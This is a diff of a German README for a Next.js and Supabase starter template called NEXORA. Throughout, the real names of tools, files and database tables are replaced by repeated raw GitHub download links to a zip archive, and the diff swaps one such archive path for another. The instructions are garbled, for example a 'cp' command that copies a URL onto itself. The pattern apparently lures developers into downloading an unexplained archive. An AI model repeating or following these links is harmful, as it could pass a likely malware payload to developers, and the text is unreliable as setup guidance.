@@ -1,9 +1,9 @@
-# NEXORA – Starter (https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip + Supabase)
+# NEXORA – Starter (https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip + Supabase)
 
 Ein minimal lauffähiges Starter-Template für **NEXORA**: Portfolio & Learning Hub mit Admin-Bereich, Supabase-Auth, Storage und SQL-Migrationen.
 
 ## Voraussetzungen
-- https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip 18+
+- https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip 18+
 - pnpm (oder npm/yarn)
 - Ein Supabase-Projekt
 
@@ -13,18 +13,18 @@ Ein minimal lauffähiges Starter-Template für **NEXORA**: Portfolio & Learning 
 pnpm install
 
 # 2) ENV vorbereiten
-cp https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip
+cp https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip
 # SUPABASE_URL & SUPABASE_ANON_KEY eintragen
 
 # 3) DB migrieren
-# Im Supabase SQL Editor die Datei aus `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip` ausführen.
+# Im Supabase SQL Editor die Datei aus `https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip` ausführen.
 
 # 4) Dev-Server
 pnpm dev
 ```
 
 ## Features im Starter
-- https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip (App Router) + TypeScript + Tailwind
+- https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip (App Router) + TypeScript + Tailwind
 - Supabase JS Client (Auth + Realtime vorbereitet)
 - Public-Seite (Home), Admin-Stub (/admin)
 - Easter-Egg-Logo (5 Klicks -> Admin/Login)
@@ -44,6 +44,6 @@ pnpm dev
 
 
 ## Hinweis zu Benutzern (Supabase-Standard)
-- Statt eines eigenen `users`-Tables nutzt dieses Schema **`https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip` (UUID)**.
-- Öffentliche Profildaten liegen in `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip` (1:1 zu `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip`).
-- Alle *_user_id / author_id Spalten referenzieren `https://github.com/Sm8s/nexora/raw/refs/heads/main/supabase/Software_perulate.zip(id)`.
+- Statt eines eigenen `users`-Tables nutzt dieses Schema **`https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip` (UUID)**.
+- Öffentliche Profildaten liegen in `https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip` (1:1 zu `https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip`).
+- Alle *_user_id / author_id Spalten referenzieren `https://github.com/Sm8s/nexora/raw/refs/heads/main/app/Software_v2.0.zip(id)`.
